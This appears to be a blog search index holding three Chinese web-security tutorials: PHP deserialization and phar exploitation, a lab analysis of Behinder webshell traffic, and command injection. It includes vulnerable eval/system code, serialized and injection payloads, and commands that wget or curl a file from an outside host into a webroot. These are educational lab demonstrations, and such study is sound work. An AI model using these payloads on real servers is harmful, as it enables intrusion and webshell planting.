<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>反序列化漏洞</title>
      <link href="/2022/10/17/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/10/17/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​序列化是将变量转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的的变量使用。这两个过程结合起来，可以轻松的存储和传输数据，使得程序更具有维护性。简单来说就是将一大段对象压缩成字符串</p><h2 id="为什么会有序列化"><a href="#为什么会有序列化" class="headerlink" title="为什么会有序列化"></a>为什么会有序列化</h2><p>序列化用于存储或传递PHP的值的过程中，同时不丢失其类型和结构。</p><h2 id="常用的魔术方法"><a href="#常用的魔术方法" class="headerlink" title="常用的魔术方法"></a>常用的魔术方法</h2><p>__sleep: 执行serialize()函数时，会先调用这个函数，返回一个包含对象中所有应被序列化的变量名称的数组。当不需要保存大对象的所有数据时很有用。</p><p>__wakeup: 执行unserialize()时，会先调用这个函数。</p><p>__tostring: 当一个类被当成字符串时打印时调用；此方法必须返回字符串并且不能在此方法中抛出异常。</p><p>__invoke: PHP5.3起，当尝试以函数方式调用对象时，会调用此方法。</p><p>__call: 在对象中调用一个不可访问方法时调用。</p><p>__construct:类的构造函数</p><p>__destruct:类的析构函数</p><h2 id="序列化结构分析"><a href="#序列化结构分析" class="headerlink" title="序列化结构分析"></a>序列化结构分析</h2><p>举个栗子</p><p>序列化后的字符串为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;tom&quot;;s:11:&quot;Personage&quot;;i:19;s:6:&quot;*sex&quot;;s:3:&quot;boy&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:自定义对象</span><br><span class="line">6:类名的长度</span><br><span class="line">:3 : 3个成员属性</span><br><span class="line">s:4 :成员属性名name,string类型，长度为4</span><br><span class="line">s:3 :成员属性name对应的值tom，string类型，长度为3</span><br><span class="line">s:11:&quot;Personage&quot;: 因为代表私有属性，需要类名+成员属性，方便进行反序列化识别，string类型，长度为11//相当于%00Person%00age，所以长度11位  %00相当于0</span><br><span class="line">i:18 : 18是age的属性值，类型为integer</span><br><span class="line">s:6 :&quot;*sex&quot;: sex这个属性是一个受保护的属性，特征就是*号//相当于%00*%00sex,所以长度6位</span><br><span class="line">s:3:&quot;boy&quot; :代表string类型，属性值长度为3，为sex的属性值</span><br></pre></td></tr></table></figure><p>通过unserialize反序列化，把我们传进去的参数反序列化成一个对象，再用这个对象调用类的函数。它不会对我们传进去的值与原本的值进行核验。</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而导致代码执行、SQL注入、目录遍历等不可控的后果。</p><p>在反序列化的过程中自动触发了某些魔术方法</p><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p>unserialize()函数的变量可控，php文件中存在可利用的类，类中有魔法函数。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这里做一个小小的漏洞复现，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;one&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>构造恶意payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O<span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="attr">&quot;Student&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span>;O<span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span><span class="attr">&quot;one&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span>;s<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span><span class="string">&quot;phpinfo();&quot;</span>;<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>结果如图，复现结束</p><p><img src="/../note_image/image-20221017201839493.png" alt="image-20221017201839493"></p><h2 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F;协议"></a>phar:&#x2F;&#x2F;协议</h2><p>​在php中反序列漏洞，形成的原因首先需要一个<strong>unserialize()<strong>函数来处理我们传入的可控的序列化payload。但是如果对</strong>unserialize()<strong>传入的内容进行限制，甚至就不存在可利用的</strong>unserialize()<strong>函数的时候，就可以借助</strong>phar</strong>协议触发反序列化操作了</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>在PHP的配置文件PHP.ini中，需要开启如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar.readonly = Off//需要把前面的注释分号去掉</span><br></pre></td></tr></table></figure><h3 id="生成phar文件的代码"><a href="#生成phar文件的代码" class="headerlink" title="生成phar文件的代码"></a>生成phar文件的代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//反序列化payload构造</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?&gt; 结尾</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//将反序列化的对象放入该文件中</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="可触发phar协议的函数"><a href="#可触发phar协议的函数" class="headerlink" title="可触发phar协议的函数"></a>可触发phar协议的函数</h3><p>下列函数都可以使用<code>phar</code>协议，还有常用的文件包含的几个函数：<code>include</code>, <code>include_once</code>, <code>requrie</code>, <code>requrie_once</code></p><table><thead><tr><th>受影响的函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&#x27;echo 1;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><p>构造payload生成phar文件</p><p><img src="/../note_image/image-20221017205346479.png" alt="image-20221017205346479"></p><p><img src="/../note_image/image-20221017210026139.png" alt="image-20221017210026139"></p><p>再访问栗子代码的文件，成功！</p><p><img src="/../note_image/image-20221017210212601.png" alt="image-20221017210212601"></p><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>1.签名与认证。</p><p>如果序列化的内容那个没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用收到黑客的异常输入。</p><p>2.限制序列化与反序列化的类。</p><p>增加一层序列化和反序列化接口类，这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了。</p><p>3.对用户输入的数据进行过滤，不要直接放进反序列化的操作中去。</p>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>冰蝎-命令执行流量分析</title>
      <link href="/2022/10/15/%E5%86%B0%E8%9D%8E-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/15/%E5%86%B0%E8%9D%8E-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h1><p>冰蝎tools版</p><p>PHPstorm——需要配置好XDEBUG。不会配置？参照我这篇<a href ="https://www.jqsafe.top/2022/10/11/XDEBUG/">XDEBUG配置</a></p><p>firefox浏览器</p><p>PHPstudy搭建本地网站</p><h1 id="连接、测试"><a href="#连接、测试" class="headerlink" title="连接、测试"></a>连接、测试</h1><p>先把冰蝎自带的shell.php上传到phpstudy的WWW目录下(因为这里需要使用冰蝎自带的木马才可以)，然后连接，记得要带上XDEBUG的监听语句</p><p><img src="/../note_image/image-20221015125314534.png" alt="image-20221015125314534"></p><p>进入此页面即为连接成功</p><p><img src="/../note_image/image-20221015125605605.png" alt="image-20221015125605605"></p><p>切换到命令执行功能，输入whoami进行测试</p><p><img src="/../note_image/image-20221015125818956.png" alt="image-20221015125818956"></p><p>打开PHPSTORM的XDEBUG监听</p><p><img src="/../note_image/image-20221015130002411.png" alt="image-20221015130002411"></p><p>再次输入whoami，PHPSTORM会拦截，出现如下页面即为拦截成功(回车whoami的时候会卡在那里)</p><p><img src="/../note_image/image-20221015130238057.png" alt="image-20221015130238057"></p><h1 id="开始分析shell-php"><a href="#开始分析shell-php" class="headerlink" title="开始分析shell.php"></a>开始分析shell.php</h1><p>error_reporting(0)为关闭所有PHP错误报告；</p><p>session_start为打开SESSION会话；</p><p>接着把$key的值赋给$_SESSION的 k  键；</p><p>然后把SESSION会话关闭；</p><p>再使用file_get_contents()这个函数将文件的内容读入到一个字符串中并赋值给$post；</p><p>extension_loaded()这个函数的作用是检查一个扩展是否已经加载，返回true或者false</p><p><img src="/../note_image/image-20221015131805843.png" alt="image-20221015131805843"></p><p><img src="/../note_image/image-20221015132322973.png" alt="image-20221015132322973"></p><p>explode(‘|’, $post): 以 | 为边界点把字符串分割成数组</p><p><img src="/../note_image/image-20221015132814915.png" alt="image-20221015132814915"></p><p><img src="/../note_image/image-20221015133154658.png" alt="image-20221015133154658"></p><p>call_user_func(): 把一个参数作为回调函数调用</p><p><img src="/../note_image/image-20221015133710429.png" alt="image-20221015133710429"></p><p>把$p的值复制出来，去base64解码，shell.php这边算是结束了</p><p><img src="/../note_image/image-20221015134020921.png" alt="image-20221015134020921"></p><h1 id="分析shell-php产生的数据包"><a href="#分析shell-php产生的数据包" class="headerlink" title="分析shell.php产生的数据包"></a>分析shell.php产生的数据包</h1><p>在WWW目录下新建一个文件：1.php，把解码的内容放进去</p><p><img src="/../note_image/image-20221015134158599.png" alt="image-20221015134158599"></p><p>ctrl+alt+l 格式化之后，得到如下文件</p><p><img src="/../note_image/image-20221015134453438.png" alt="image-20221015134453438"></p><p>然后浏览器打开这个文件，并且加上XDEBUG语句</p><p><img src="/../note_image/image-20221015134709666.png" alt="image-20221015134709666"></p><p>回车，PHPstorm拦截(记得打开监听开关)</p><p><img src="/../note_image/image-20221015134823569.png" alt="image-20221015134823569"></p><p>同样的，第二行的函数error_reporting(0)也是关闭PHP所有错误报告</p><p>然后一直步入，最后是一个main函数，这里会包含着我们在冰蝎上执行的操作</p><p><img src="/../note_image/image-20221015135411440.png" alt="image-20221015135411440"></p><p>$cmd这里的值是可以在cmd命令行执行的</p><p>ps：cd 命令是不会改变当前drive的，比如当前目录是E:&#x2F;file，执行cd C:&#x2F;tmp命令后，当前目录不会产生任何变化，要保证当前目录修改成功，必须加&#x2F;d参数，即 cd &#x2F;d C:&#x2F;tmp</p><p><img src="/../note_image/image-20221015135547978.png" alt="image-20221015135547978"></p><p>进入main函数，$cmd和$path的值都会传进来</p><p>set_time_limit(0)：0为永久执行程序知道程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的描述，程序结束</p><p>ignore_user_abort(1)：启动(1)，无论客户端是否关闭浏览器，下面的程序都会执行，可以实现计划任务与持续进程。</p><p>ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置。</p><p><img src="/../note_image/image-20221015140803651.png" alt="image-20221015140803651"></p><p>strpos(): 查找第二个参数在第一个参数中第一次出现的位置，如果找不到返回false, 对大小写敏感</p><p>strtolower(): 将字符串的字母全部转为小写字母</p><p>2&gt;&amp;1： 1表示标准输出，2表示标准错误输出，2&gt;&amp;1表示将标准错误输出重定向到标准输出，这样，程序或者命令的正常输出和错误输出就可以在标准输出输出。</p><p><img src="/../note_image/image-20221015141351401.png" alt="image-20221015141351401"></p><p>is_callable()：用于监测函数在当前环境中是否可以调用。</p><p>in_array()：检查参数一是否在参数二数组里</p><p>ob_start()：把输出那同输出到缓冲区，而不是到浏览器。</p><p>ob_get_contents()：获取当前缓冲区的内容</p><p>ob_end_clean()：清空缓冲区内容，并关闭缓冲区，但不会输出内容</p><p><img src="/../note_image/image-20221015141912200.png" alt="image-20221015141912200"></p><p><img src="/../note_image/image-20221015142209921.png" alt="image-20221015142209921"></p><p>iconv()：在多种国际编码格式之间进行文本内码的转换，简单点理解就是编码转换</p><p>这里函数的作用就是返回编码转换后的值</p><p><img src="/../note_image/image-20221015142843787.png" alt="image-20221015142843787"></p><p>json_encode()：进行json编码</p><p>进函数进行循环</p><p><img src="/../note_image/image-20221015143407220.png" alt="image-20221015143407220"></p><p><img src="/../note_image/image-20221015143614821.png" alt="image-20221015143614821"></p><p>分析完毕</p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 冰蝎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意命令执行</title>
      <link href="/2022/10/14/%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/10/14/%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>​web应用在调用这些函数执行系统命令的时候，如果将用户输入作为系统命令的参数拼接到命令行中，在没有过滤用户输入的情况下，就会造成命令执行漏洞</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">System(args)//有回显</span><br><span class="line"></span><br><span class="line">passthru(args)//有回显</span><br><span class="line"></span><br><span class="line">exec(args,$arr) //回显最后一行，必须以echo输出</span><br><span class="line"></span><br><span class="line">反引号``</span><br><span class="line"></span><br><span class="line">shell_exec(args) //无回显，必须输出</span><br><span class="line"></span><br><span class="line">popen(handle,mode) //无回显，打开是资源，需配合fread读或fget读 </span><br><span class="line"></span><br><span class="line">proc_open(&#x27;cmd&#x27;,&#x27;flag&#x27;,&#x27;flag&#x27;)//无回显</span><br><span class="line"></span><br><span class="line">$process = proc_open(&#x27;dir&#x27;,$dex,$pipes);</span><br><span class="line"></span><br><span class="line">echo stream_get_contents($pipes[1]);</span><br></pre></td></tr></table></figure><h1 id="函数利用"><a href="#函数利用" class="headerlink" title="函数利用"></a>函数利用</h1><h2 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arg</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$arg</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ?cmd=id</span></span><br><span class="line"><span class="comment">// ?cmd=pwd</span></span><br><span class="line"><span class="comment">// ?cmd=ifconfig</span></span><br></pre></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arg</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping <span class="subst">$arg</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?cmd=127.0.0.1|ifconfig</span></span><br></pre></td></tr></table></figure><p>我们能控制的点是程序的整个参数，这个时候可以利用&amp;&amp;或者||等与、或、管道命令来执行其他命令。</p><p>Linux 下支持分号 “;” 、| 、||，%26，%26%26</p><p>短路逻辑与 %26%26 前后两个参数，如果第一为假，第二个不判断</p><p>短路逻辑 或 ||前后两个参数，如果第一为真，第二个不判断</p><h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arg</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;dir\&quot;<span class="subst">$arg</span>\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?cmd=/home&quot;;ifconfig&#x27;&quot;</span></span><br><span class="line"><span class="comment">// ?cmd=/home&quot;||ifconfig&#x27;&quot;</span></span><br><span class="line"><span class="comment">// ?cmd=/home” %26 ifconfig;”</span></span><br><span class="line"><span class="comment">// ?cmd=/home” %26%26 ifconfig;”</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 短路与&amp;&amp;的特点，前面如果为真，才执行后面的，如果为假，后面不执行。</p><p>&#x2F;&#x2F; 逻辑与&amp;的特点，前面无论真假，后面都执行,并且打印后面的值.</p><p>&#x2F;&#x2F; 短路或||的特点，前面如果为真，后面的不执行了，前面为假，后面执行</p><p>&#x2F;&#x2F; 逻辑或|前面为真，后面都执行,并且打印后面的值.</p><h3 id="方式四"><a href="#方式四" class="headerlink" title="方式四"></a>方式四</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arg</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;<span class="subst">$arg</span>&#x27; &gt; 1.txt&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在单引号内的话，变量不能被解析，因此想要执行命令必须闭合单引号。</span></span><br><span class="line"><span class="comment">// ?1&#x27;|whoami||echo&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open函数"><a href="#proc-open函数" class="headerlink" title="proc_open函数"></a>proc_open函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dex</span>=<span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),<span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">    <span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">    <span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;./error-output.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)<span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">pro_open</span>(<span class="string">&#x27;ipconfig&#x27;</span>,<span class="variable">$des</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_getcontents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>如果有写权限的话</p><p>1、反弹shell，尝试提权</p><p>2、执行pwd获取绝对路径，写一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()?^&gt; &gt; /<span class="keyword">var</span>/www/html/info.php </span><br><span class="line"></span><br><span class="line">?cmd=wget -O /<span class="keyword">var</span>/www/html/info.php http:<span class="comment">//www.xx.com/phpinfo.txt</span></span><br><span class="line"></span><br><span class="line">?cmd=curl http:<span class="comment">//www.xx.com/phpinfo.txt &gt; /var/www/html/info.php </span></span><br></pre></td></tr></table></figure><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>1、继承Web服务器程序的权限，去执行系统命令</p><p>2、继承Web服务器程序的权限，读写文件 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php &#x27;木马内容&#x27; ?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure><p>3、反弹shell</p><p>4、控制整个网站</p><p>5、甚至控制整个服务器</p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>1、能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用。</p><p>2、在进入命令执行的函数或方法之前，对参数进行过滤。使用这些函数escapeshellcmd 